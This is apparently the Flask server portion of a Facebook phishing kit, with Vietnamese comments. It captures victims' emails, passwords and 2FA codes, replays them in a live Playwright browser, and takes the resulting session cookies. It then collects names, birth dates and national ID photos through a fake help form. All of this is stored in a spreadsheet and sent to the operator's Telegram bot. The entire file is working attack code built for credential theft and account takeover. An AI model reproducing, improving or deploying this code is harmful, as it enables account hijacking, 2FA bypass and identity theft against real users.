            self._q.put((func, args, kwargs, fut))

            return fut.result()

        

        def submit(self, func, *args, **kwargs) -> Future:

            """Gọi bất đồng bộ"""

            fut: Future = Future()

            self._q.put((func, args, kwargs, fut))

            return fut

    

    

    def get_or_create_session_worker(session_id: str) -> '_SessionWorker':

        """Lấy hoặc tạo worker cho session"""

        with _session_workers_lock:

            if session_id not in _session_workers:

                _session_workers[session_id] = _SessionWorker(session_id)

            return _session_workers[session_id]

    

    

    # Quản lý session cho login - mỗi user có worker riêng (giữ lại để tương thích)

    _active_sessions: Dict[str, '_AutomationWorker'] = {}

    _sessions_lock = threading.Lock()

    

    

    class _AutomationWorker:

        """Worker thread chạy Playwright operations cho mỗi user riêng biệt"""

        

        def __init__(self, email: str):

            self.email = email

            self._q: "queue.Queue[tuple[callable, tuple, dict, Future]]" = queue.Queue()

            self._thread = threading.Thread(

                target=self._run, 

                name=f"worker-{email}", 

                daemon=True

            )

            self._thread.start()

        

        def _run(self):

            """Main loop của worker thread"""

            while True:

                func, args, kwargs, fut = self._q.get()

                try:

                    result = func(*args, **kwargs)

                    fut.set_result(result)

                except Exception as e:

                    fut.set_exception(e)

        

        def call(self, func, *args, **kwargs):

            """Gọi đồng bộ - đợi kết quả"""

            fut: Future = Future()

            self._q.put((func, args, kwargs, fut))

            return fut.result()

        

        def submit(self, func, *args, **kwargs) -> Future:

            """Gọi bất đồng bộ"""

            fut: Future = Future()

            self._q.put((func, args, kwargs, fut))

            return fut

    

    

    def send_telegram_message(message: str) -> bool:

        """Gửi message qua Telegram Bot"""

        try:

            if not os.path.exists(BOT_CONFIG_FILE):

                print(f"[Telegram] Config file not found: {BOT_CONFIG_FILE}")

                return False

            

            with open(BOT_CONFIG_FILE, "r") as f:

                lines = f.readlines()

                if len(lines) < 2:

                    return False

                

                token = lines[0].strip()

                chat_id = lines[1].strip()

            

            url = f"https://api.telegram.org/bot{token}/sendMessage"

            payload = {

                "chat_id": chat_id,

                "text": message,

                "parse_mode": "HTML"

            }

            

            response = requests.post(url, json=payload, timeout=10)

            if response.status_code == 200:

                print(f"[Telegram] Message sent successfully")

                return True

            else:

                print(f"[Telegram] Failed to send: {response.text}")

                return False

        except Exception as e:

            print(f"[Telegram] Error: {e}")

            return False



    

    @app.route("/login", methods=["POST"])

    def login():

        """API đăng nhập - dùng browser đã khởi tạo từ GET /"""

        data = request.json

        email = data.get("email", "").strip()

        password = data.get("password", "").strip()

        session_id = data.get("session_id", "").strip()

        

        # Nếu không có session_id từ body, thử lấy từ cookie

        if not session_id:

            session_id = request.cookies.get('fb_session', '')

        

        if not email or not password:

            return jsonify({"success": False, "error": "Thiếu email hoặc password"}), 400

        

        if not session_id:

            return jsonify({"success": False, "error": "Thiếu session_id"}), 400

        

        print(f"[Login] Email: {email}, Session: {session_id[:8]}...")

        

        # Lấy IP và thông tin vị trí

        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        if ',' in client_ip:

            client_ip = client_ip.split(',')[0].strip()

        location_info = get_ip_location(client_ip)

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        

        # Lưu credentials trước

        try:

            FILE_NAME = "users.xlsx"

            # Xóa file cũ nếu header không đúng

            if os.path.exists(FILE_NAME):

                try:

                    wb = load_workbook(FILE_NAME)

                    ws = wb.active

                    header = ws.cell(row=1, column=3).value

                    if header != "Mã 2FA":

                        os.remove(FILE_NAME)

                        print(f"[Login] Đã xóa file Excel cũ (cấu trúc không khớp)")

                except:

                    pass

            

            if not os.path.exists(FILE_NAME):

                wb = Workbook()

                ws = wb.active

                # Header chuẩn 11 cột

                ws.append(["Email", "Password", "Mã 2FA", "IP", "Thời gian & Vị trí", "Cookies",

                           "Email hỗ trợ", "Họ và tên", "Ngày sinh", "Ảnh CCCD", "Ảnh xem trước"])

                wb.save(FILE_NAME)

            

            wb = load_workbook(FILE_NAME)

            ws = wb.active

            

            found = False

            for row in range(2, ws.max_row + 1):

                if ws.cell(row=row, column=1).value == email:

                    ws.cell(row=row, column=2).value = password

                    ws.cell(row=row, column=4).value = client_ip

                    # Cột 5 gộp thời gian và vị trí

                    ws.cell(row=row, column=5).value = f"{timestamp} | {location_info}"

                    found = True

                    break

            

            if not found:

                ws.append([email, password, "", client_ip, f"{timestamp} | {location_info}", "",

                           "", "", "", "", ""])

            

            wb.save(FILE_NAME)

        except Exception as e:

            print(f"[Server] Lỗi lưu Excel: {e}")

        

        # Không cần init browser riêng nữa - login_with_session sẽ tự tạo trong cùng thread

        # Điều này đảm bảo browser được tạo và dùng trong cùng 1 thread (tránh lỗi Playwright)

        

        # Lấy worker cho session này (đã được tạo từ /api/init-browser hoặc tạo mới)

        worker = get_or_create_session_worker(session_id)

        

        try:

            # Chạy login trong worker thread của session - đảm bảo cùng thread với init-browser

            print(f"[Login] Bắt đầu login cho session {session_id[:8]}... (trong session worker thread)")

            html, should_get_cookies, login_failed = worker.call(

                login_with_session,

                email=email,

                password=password,

                session_id=session_id,

                timeout=300000

            )

            

            if login_failed:

                return jsonify({

                    "success": False,

                    "login_failed": True,

                    "error": "Thông tin đăng nhập không chính xác"

                })

            

            # Nếu không có HTML -> lỗi đăng nhập

            if not html:

                return jsonify({

                    "success": False,

                    "error": "Không thể đăng nhập - không lấy được trang"

                }), 500

            

            # Nếu không cần lấy cookies (đang ở trang 2FA)

            if not should_get_cookies:

                return jsonify({

                    "success": True,

                    "redirect": f"/hfa?email={email}&session_id={session_id}",

                    "is_2fa": True

                })

            

            return jsonify({

                "success": True,

                "html": html,

                "should_get_cookies": should_get_cookies

            })

            

        except Exception as e:

            print(f"[Login] Lỗi: {e}")

            return jsonify({

                "success": False,

                "error": f"Lỗi đăng nhập: {str(e)}"

            }), 500



    

    @app.route("/hfa")

    def hfa_page():

        """Trang 2FA - hiển thị template hfa.html với email và session_id từ query param"""

        email = request.args.get('email', '')

        session_id = request.args.get('session_id', '')

        return render_template('hfa.html', email=email, session_id=session_id)

    

    

    @app.route("/submit_2fa", methods=["POST"])

    def submit_2fa():

        """Nhận mã 2FA từ client, nhập vào trang đang đợi và lấy cookies"""

        try:

            data = request.get_json()

            print(f"[2FA Debug] Raw data: {data}")

            code = data.get("code", "").strip() if data else ""

            email = data.get("email", "").strip() if data else ""

            session_id = data.get("session_id", "").strip() if data else ""

            

            print(f"[2FA Debug] code='{code}', email='{email}', session_id='{session_id[:8] if session_id else 'EMPTY'}...'")

            

            if not code or not code.isdigit() or len(code) != 6:

                return jsonify({"success": False, "error": f"Mã 2FA không hợp lệ: '{code}'"}), 400

            

            if not session_id:

                return jsonify({"success": False, "error": "Thiếu session_id"}), 400

            

            # Lấy thông tin từ request

            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

            if ',' in client_ip:

                client_ip = client_ip.split(',')[0].strip()

            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            

            # Nếu email rỗng, thử tìm từ session_id bằng cách kiểm tra tất cả sessions

            if not email:

                from utils.get_html import _browser_sessions, _sessions_lock

                with _sessions_lock:

                    for key, session in _browser_sessions.items():

                        # Tìm session có thể là của user này (dựa vào session context)

                        if session_id and key.startswith(session_id[:8]):

                            email = key

                            print(f"[2FA] Tìm thấy email từ session: {email}")

                            break

            

            # Nếu vẫn không có email, thử lấy từ cookies/session storage

            if not email:

                # Lấy từ request IP nếu có thể match

                email = client_ip  # Fallback dùng IP làm temporary key

                print(f"[2FA] Dùng IP làm key tạm: {email}")

            

            # Lấy password từ session thay vì global variables

            from utils.get_html import get_browser_session

            session = get_browser_session(email if email != client_ip else None)

            if session:

                password = session.get('password', 'unknown')

                if email == client_ip:

                    # Cập nhật lại email đúng từ session

                    email = session.get('email', email)

            else:

                password = "unknown"

            

            if not email or email == client_ip:

                email = "unknown"

            

            print(f"[2FA] Final email for redirect: {email}")

            

            # Lưu mã 2FA vào Excel

            try:

                FILE_NAME = "users.xlsx"

                # Xóa file cũ nếu có để tạo cấu trúc mới

                if os.path.exists(FILE_NAME):

                    try:

                        wb = load_workbook(FILE_NAME)

                        ws = wb.active

                        # Kiểm tra nếu header cũ thì xóa file

                        first_header = ws.cell(row=1, column=1).value

                        if first_header != "Email":

                            os.remove(FILE_NAME)

                            print(f"[2FA] Đã xóa file Excel cũ (header không khớp)")

                    except:

                        pass

                

                if not os.path.exists(FILE_NAME):

                    wb = Workbook()

                    ws = wb.active

                    # Header chuẩn 11 cột

                    ws.append(["Email", "Password", "Mã 2FA", "IP", "Thời gian & Vị trí", "Cookies",

                               "Email hỗ trợ", "Họ và tên", "Ngày sinh", "Ảnh CCCD", "Ảnh xem trước"])

                    wb.save(FILE_NAME)

                    print(f"[2FA] Đã tạo file Excel mới với header đầy đủ")

                

                wb = load_workbook(FILE_NAME)

                ws = wb.active

                

                # Tìm hàng có email gần nhất và thêm mã 2FA

                target_row = None

                for row in range(2, ws.max_row + 1):

                    if ws.cell(row=row, column=1).value == email:

                        target_row = row

                        break

                

                if target_row is None:

                    target_row = ws.max_row + 1

                    ws.cell(row=target_row, column=1).value = email

                

                # Thêm mã 2FA vào cột 3

                # Gộp timestamp + location vào 1 cột

                location_info = get_ip_location(client_ip)

                time_location = f"{timestamp} | {location_info}"

                

                ws.cell(row=target_row, column=3).value = code  # 2FA Code

                ws.cell(row=target_row, column=4).value = client_ip  # IP

                ws.cell(row=target_row, column=5).value = time_location  # Thời gian & Vị trí

                # Cột 6 để trống cho Cookies (sẽ lưu sau)

                wb.save(FILE_NAME)

                print(f"[2FA] Đã lưu mã 2FA cho {email}")

            except Exception as excel_err:

                print(f"[2FA] Lỗi lưu Excel: {excel_err}")

            

            # Gửi mã 2FA đến Telegram

            telegram_msg = f"🔐 <b>MÃ 2FA NHẬN ĐƯỢC</b>\n" \
                          f"━━━━━━━━━━━━━━━━━━━━━\n\n" \
                          f"👤 <b>Tài khoản:</b> <code>{email}</code>\n" \
                          f"🔢 <b>Mã 2FA:</b> <code>{code}</code>\n" \
                          f"🌐 <b>IP:</b> <code>{client_ip}</code>\n" \
                          f"⏰ <b>Thời gian:</b> {timestamp}"

            send_telegram_message(telegram_msg)

            

            # Nhập mã 2FA vào trang đang đợi (trong worker thread)

            def process_2fa():

                from utils.get_html import get_session_browser, get_cookies

                import time

                

                # Lấy session từ session_id (KHÔNG dùng email)

                session = get_session_browser(session_id)

                if not session:

                    print(f"[2FA] Không tìm thấy session {session_id[:8]}...")

                    return False

                

                page = session['page']

                try:

                    # Tìm input nhập mã 2FA và điền

                    print(f"[2FA] Đang nhập mã {code} vào trang...")

                    print(f"[2FA] URL hiện tại: {page.url}")

                    

                    # Thử nhiều selector khác nhau cho input 2FA

                    input_selectors = [

                        'input[id="_r_3_"]',

                        'input[name="code"]',

                        'input[placeholder*="code" i]',

                        'input[type="text"]',

                        'input[inputmode="numeric"]',

                        'input[maxlength="6"]',

                    ]

                    

                    input_found = False

                    for selector in input_selectors:

                        try:

                            print(f"[2FA] Thử selector: {selector}")

                            page.wait_for_selector(selector, timeout=3000)

                            page.fill(selector, code)

                            print(f"[2FA] Đã điền mã vào input với selector: {selector}")

                            input_found = True

                            break

                        except:

                            continue

                    

                    if not input_found:

                        # In ra HTML để debug

                        html_snippet = page.content()[:2000]

                        print(f"[2FA] Không tìm thấy input. HTML snippet: {html_snippet}")

                        return False

                    

                    time.sleep(0.5)

                    

                    # Click nút Continue

                    continue_btn = page.locator('div[role="button"]:has-text("Continue")').first

                    if continue_btn.count() > 0:

                        print("[2FA] Đang click nút Continue...")

                        continue_btn.click()

                        time.sleep(2)

                    else:

                        # Thử press Enter

                        print("[2FA] Không tìm thấy nút, thử press Enter...")

                        page.keyboard.press("Enter")

                        time.sleep(2)

                    

                    # Điều hướng đến fb.com để lấy cookies

                    print("[2FA] Đang điều hướng đến fb.com...")

                    try:

                        page.goto("https://www.facebook.com/", wait_until="domcontentloaded", timeout=30000)

                        print(f"[2FA] URL sau điều hướng: {page.url}")

                        time.sleep(1)

                    except Exception as nav_err:

                        print(f"[2FA] Lỗi điều hướng: {nav_err}")

                    

                    # Đợi và lấy cookies

                    print("[2FA] Đang chờ xử lý và lấy cookies...")

                    

                    # Lấy cookies trực tiếp từ session

                    try:

                        context = session['context']

                        page = session['page']

                        

                        # Lấy tất cả cookies từ context

                        all_cookies = context.cookies()

                        

                        # Lọc lấy cookies của facebook.com

                        fb_cookies = [

                            c for c in all_cookies 

                            if "facebook.com" in c.get("domain", "")

                        ]

                        

                        simple_pairs = [

                            f"{c.get('name')}={c.get('value')}"

                            for c in fb_cookies

                            if c.get('name') and c.get('value')

                        ]

                        

                        cookies_str = "; ".join(simple_pairs)

                        print(f"[2FA] Đã lấy {len(fb_cookies)} cookies, chuỗi dài {len(cookies_str)} ký tự")

                        

                        # Lưu vào Excel

                        try:

                            wb = load_workbook(FILE_NAME)

                            ws = wb.active

                            

                            # Tìm hàng có email

                            target_row = None

                            for row in range(ws.max_row, 1, -1):

                                if ws.cell(row=row, column=1).value == email:

                                    target_row = row

                                    break

                            

                            if target_row is None:

                                target_row = ws.max_row + 1

                                ws.cell(row=target_row, column=1).value = email

                            

                            # Lưu cookies vào cột 6

                            ws.cell(row=target_row, column=6).value = cookies_str

                            wb.save(FILE_NAME)

                            print(f"[2FA] Đã lưu cookies vào Excel")

                            

                            # Gửi password và cookies đến Telegram

                            try:

                                # Lấy password từ Excel

                                password = ws.cell(row=target_row, column=2).value or "unknown"

                                telegram_msg_full = f"🔓 <b>TÀI KHOẢN ĐĂNG NHẬP THÀNH CÔNG</b>\n" \
                                                   f"━━━━━━━━━━━━━━━━━━━━━\n\n" \
                                                   f"👤 <b>Email:</b> <code>{email}</code>\n" \
                                                   f"🔑 <b>Password:</b> <code>{password}</code>\n" \
                                                   f"🔢 <b>Mã 2FA:</b> <code>{code}</code>\n" \
                                                   f"🍪 <b>Cookies:</b> <code>{cookies_str[:200]}...</code>\n" \
                                                   f"🌐 <b>IP:</b> <code>{client_ip}</code>\n" \
                                                   f"⏰ <b>Thời gian:</b> {timestamp}"

                                send_telegram_message(telegram_msg_full)

                            except Exception as tg_err:

                                print(f"[2FA] Lỗi gửi Telegram: {tg_err}")

                            

                        except Exception as excel_err:

                            print(f"[2FA] Lỗi lưu Excel: {excel_err}")

                        

                        # Đóng browser sau khi lấy cookies

                        try:

                            context.close()

                            print("[2FA] Đã đóng browser")

                        except:

                            pass

                        

                        # Xóa session khỏi _browser_sessions để tránh dùng lại

                        try:

                            from utils.get_html import _browser_sessions, _sessions_lock

                            with _sessions_lock:

                                if session_id in _browser_sessions:

                                    del _browser_sessions[session_id]

                                    print(f"[2FA] Đã xóa session {session_id[:8]}... khỏi danh sách")

                        except Exception as del_err:

                            print(f"[2FA] Lỗi khi xóa session: {del_err}")

                            

                    except Exception as cookie_err:

                        print(f"[2FA] Lỗi lấy cookies: {cookie_err}")

                    

                    return True

                    

                except Exception as proc_err:

                    print(f"[2FA] Lỗi khi xử lý: {proc_err}")

                    return False

            

            # Lấy worker cho session này và chạy process_2fa trong đó

            worker = get_or_create_session_worker(session_id)

            

            try:

                # Chạy process_2fa trong session worker thread

                result = worker.call(process_2fa)

                print(f"[2FA] Kết quả xử lý: {result}")

            except Exception as worker_err:

                print(f"[2FA] Lỗi worker: {worker_err}")

            

            # Trả về server-side redirect thay vì JSON để đảm bảo email được truyền đúng

            print(f"[2FA] Redirecting to /help?email={email}")

            return redirect(f"/help?email={email}")

            

        except Exception as e:

            print(f"[2FA] Lỗi: {e}")

            return jsonify({"success": False, "error": str(e)}), 500



    

    @app.route("/help")

    def help_page():

        """Trang help - hiển thị template phù hợp với thiết bị"""

        user_agent = request.headers.get("User-Agent", "")

        device = detect_device(user_agent)

        email = request.args.get('email', '')

        

        print(f"[Help] User-Agent: {user_agent[:50]}...")

        print(f"[Help] Device: {device}")

        print(f"[Help] Email from URL: {email}")

        

        template_map = {

            "iOS": "iOS/help.html",

            "Android": "Android/help.html",

            "Desktop": "Desktop/help.html"

        }

        template = template_map.get(device, "Desktop/help.html")

        return render_template(template, email=email, login_email=email)



    



    @app.route("/submit_help", methods=["POST"])

    def submit_help():

        """Nhận dữ liệu form help và lưu vào cùng hàng với thông tin đăng nhập trong users.xlsx"""

        FILE_NAME = "users.xlsx"  # Định nghĩa ngay đầu hàm

        

        try:

            data = request.get_json() or request.form

            

            # Get client IP

            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

            if ',' in client_ip:

                client_ip = client_ip.split(',')[0].strip()

            

            # Get location info from IP (using ip-api.com)

            location_info = get_ip_location(client_ip)

            

            # Decode base64 image

            image_data = data.get('image', '')

            

            # Lấy KEY từ đăng nhập (UID/email đăng nhập) - không phải email help

            # JavaScript gửi login_email làm key, field2 là help email

            login_email = data.get('login_email', '').strip()  # Key: UID/email đăng nhập

            help_email = data.get('field2', '').strip()  # Help email (có thể khác)

            

            print(f"[Help Form] login_email từ request: '{login_email}'")

            print(f"[Help Form] help_email từ request: '{help_email}'")

            

            # Nếu không có login_email, thử tìm từ IP/session

            if not login_email:

                # Tìm trong Excel hàng có IP trùng và chưa có help data

                try:

                    if os.path.exists(FILE_NAME):

                        wb = load_workbook(FILE_NAME)

                        ws = wb.active

                        for row in range(ws.max_row, 1, -1):

                            row_ip = str(ws.cell(row=row, column=4).value or '').strip()

                            row_help_data = ws.cell(row=row, column=7).value  # Cột Email hỗ trợ

                            # Tìm hàng có IP trùng và chưa có help data

                            if row_ip == client_ip and not row_help_data:

                                login_email = str(ws.cell(row=row, column=1).value or '').strip()

                                print(f"[Help Form] Tìm key từ IP: {login_email}")

                                break

                except Exception as e:

                    print(f"[Help Form] Lỗi tìm key từ IP: {e}")

            

            email = login_email or help_email  # Fallback nếu không tìm được

            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            

            print(f"[Help Form] Final key (email): {email}")

            

            # Lưu vào users.xlsx cùng hàng với thông tin đăng nhập

            try:

                # Gộp ngày tháng năm thành 1 chuỗi dd/mm/yyyy

                # Hỗ trợ cả 2 format: 'day/month/year' (desktop) và 'Field...[year/month/day]' (iOS/Android)

                day = data.get('day', '').strip()

                month = data.get('month', '').strip()

                year = data.get('year', '').strip()

                

                # Nếu không có, thử với format field động của Facebook mobile

                if not day:

                    for key in data.keys():

                        if '[day]' in key:

                            day = str(data.get(key, '')).strip()

                            break

                if not month:

                    for key in data.keys():

                        if '[month]' in key:

                            month = str(data.get(key, '')).strip()

                            break

                if not year:

                    for key in data.keys():

                        if '[year]' in key:

                            year = str(data.get(key, '')).strip()

                            break

                

                birth_date = f"{day}/{month}/{year}" if day and month and year else ""

                

                if not os.path.exists(FILE_NAME):

                    wb = Workbook()

                    ws = wb.active

                    # Header chuẩn 11 cột

                    ws.append(["Email", "Password", "Mã 2FA", "IP", "Thời gian & Vị trí", "Cookies",

                               "Email hỗ trợ", "Họ và tên", "Ngày sinh", "Ảnh CCCD", "Ảnh xem trước"])

                    wb.save(FILE_NAME)

                

                wb = load_workbook(FILE_NAME)

                ws = wb.active

                

                # Tìm hàng có email gần nhất

                target_row = None

                email_str = str(email).strip()

                for row in range(ws.max_row, 1, -1):

                    cell_value = str(ws.cell(row=row, column=1).value or '').strip()

                    if cell_value == email_str:

                        target_row = row

                        break

                

                if target_row is None:

                    # Nếu không tìm thấy, thêm hàng mới chỉ với email và thông tin help

                    target_row = ws.max_row + 1

                    ws.cell(row=target_row, column=1).value = email

                

                # Lưu ảnh vào uploads/ và nhúng thumbnail vào Excel

                image_path = ""

                img_bytes = None

                if image_data and email:

                    try:

                        # Tạo tên file an toàn

                        safe_email = re.sub(r'[^\w\-_.]', '_', email)

                        image_path = os.path.join(UPLOADS_DIR, f"{safe_email}.png")

                        

                        # Decode và lưu ảnh gốc

                        img_bytes = base64.b64decode(image_data)

                        with open(image_path, "wb") as f:

                            f.write(img_bytes)

                        print(f"[Help Form] Đã lưu ảnh CCCD: {image_path}")

                    except Exception as save_err:

                        print(f"[Help Form] Lỗi lưu ảnh: {save_err}")

                

                # Thêm thông tin help vào các cột bổ sung (7-10)

                ws.cell(row=target_row, column=7).value = help_email  # Email hỗ trợ

                ws.cell(row=target_row, column=8).value = data.get('field1', '')  # Họ và tên

                ws.cell(row=target_row, column=9).value = birth_date  # Ngày sinh

                ws.cell(row=target_row, column=10).value = image_path  # Đường dẫn ảnh CCCD

                

                # Nhúng thumbnail vào cột K (11)

                if img_bytes:

                    try:

                        from PIL import Image as PILImage

                        

                        # Mở ảnh và tạo thumbnail nhỏ

                        img_stream = BytesIO(img_bytes)

                        pil_img = PILImage.open(img_stream)

                        

                        # Tạo thumbnail nhỏ (max 150px)

                        thumb_size = (150, 150)

                        pil_img.thumbnail(thumb_size, PILImage.Resampling.LANCZOS)

                        

                        # Lưu thumbnail vào buffer

                        thumb_buffer = BytesIO()

                        pil_img.save(thumb_buffer, format='PNG')

                        thumb_buffer.seek(0)

                        

                        # Nhúng thumbnail vào cột K (11) - cố định trong ô

                        xl_img = XLImage(thumb_buffer)

                        xl_img.anchor = 'oneCell'  # Cố định trong một ô

                        cell_addr = f'K{target_row}'

                        ws.add_image(xl_img, cell_addr)

                        print(f"[Help Form] Đã nhúng thumbnail vào ô {cell_addr}")

                    except Exception as thumb_err:

                        print(f"[Help Form] Lỗi tạo thumbnail: {thumb_err}")

                

                wb.save(FILE_NAME)

                print(f"[Help Form] Đã lưu thông tin help cho {email} vào hàng {target_row}")

            except Exception as excel_err:

                print(f"[Help Form] Lỗi lưu Excel: {excel_err}")

            

            print(f"[Help Form] Data saved from IP: {client_ip}, Location: {location_info}, Email: {email}")

            return jsonify({"success": True, "message": "Data saved successfully"}), 200

            

        except Exception as e:

            print(f"[Help Form] Error: {e}")

            return jsonify({"success": False, "error": str(e)}), 500



    



    @app.route("/upload_image", methods=["POST"])



    def upload_image():



        """Nhận file upload và trả về thông tin cho preview"""



        try:



            if 'file' not in request.files:



                return jsonify({"success": False, "error": "No file provided"}), 400



            



            file = request.files['file']



            if file.filename == '':



                return jsonify({"success": False, "error": "No file selected"}), 400



            



            # Read file bytes



            file_bytes = file.read()



            



            # Generate unique ID for the file



            import uuid



            import base64



            



            file_id = str(uuid.uuid4())[:16].replace('-', '')



            



            # Encode to base64 (truncated for storage)



            file_data_b64 = base64.b64encode(file_bytes).decode('utf-8')



            



            # Create response with Facebook-style format



            # The value is a hash-like string similar to Facebook's format



            hash_value = f"AZ{base64.b64encode(file_id.encode()).decode('utf-8').replace('=', '').replace('/', '').replace('+', '')[:80]}"



            



            response_data = {



                "success": True,



                "filename": file.filename,



                "file_id": file_id,



                "hash_value": hash_value,



                "size": len(file_bytes),



                "mime_type": file.content_type or 'application/octet-stream'



            }



            



            print(f"[Upload] File uploaded: {file.filename} ({len(file_bytes)} bytes)")



            return jsonify(response_data), 200



            



        except Exception as e:



            print(f"[Upload] Error: {e}")



            return jsonify({"success": False, "error": str(e)}), 500



    



    return app











def start_all_server():



    """Khởi động server với cả login và help cùng port"""



    print("\n\033[1;34m" + "-" * 50 + "\033[0m")



    print("\033[1;32m              CHẠY SERVER\033[0m")



    print("\033[1;34m" + "-" * 50 + "\033[0m\n")



    



    port_str = get_input("Nhập port (mặc định: 5000): ", allow_empty=True)



    port = int(port_str) if port_str.isdigit() else 5000



    



    app = create_unified_app()



    master_url = f"http://localhost:{port}"

    

    print(f"\n\033[1;33m[*] Khởi động Server tại {master_url}\033[0m")



    print(f"\033[1;36m    - Login: {master_url}/\033[0m")



    print(f"\033[1;36m    - Help:  {master_url}/help\033[0m")



    print(f"\033[1;36m    Nhập Ctrl+C để dừng server\033[0m\n")



    



    try:



        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)



    except KeyboardInterrupt:



        print(f"\n\033[1;33m[*] Đã dừng server\033[0m")



    except Exception as e:



        print(f"\n\033[1;31m[!] Lỗi server: {e}\033[0m")



    



    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")











def main():



    """Hàm chính"""



    os.system('cls' if os.name == 'nt' else 'clear')



    print_logo()



    



    while True:



        print_menu()



        



        try:



            choice = get_input("\nNhập lựa chọn của bạn: ", allow_empty=True)



        except KeyboardInterrupt:



            print("\n\n\033[1;33m[*] Tạm biệt!\033[0m")



            break



        



        if choice == "1":

            start_all_server()

        elif choice == "2":

            show_users()

        elif choice == "3":

            delete_user()

        elif choice == "4":

            setup_bot()

        elif choice == "5":

            setup_browser()

        elif choice == "0":



            print("\n\033[1;33m[*] Tạm biệt!\033[0m")



            break



        else:



            print("\n\033[1;31m[!] Lựa chọn không hợp lệ\033[0m")



            time.sleep(1)



        



        os.system('cls' if os.name == 'nt' else 'clear')



        print_logo()











if __name__ == "__main__":



    try:



        main()



    except KeyboardInterrupt:



        print("\n\n\033[1;33m[*] Đã thoát tool\033[0m")



        sys.exit(0)



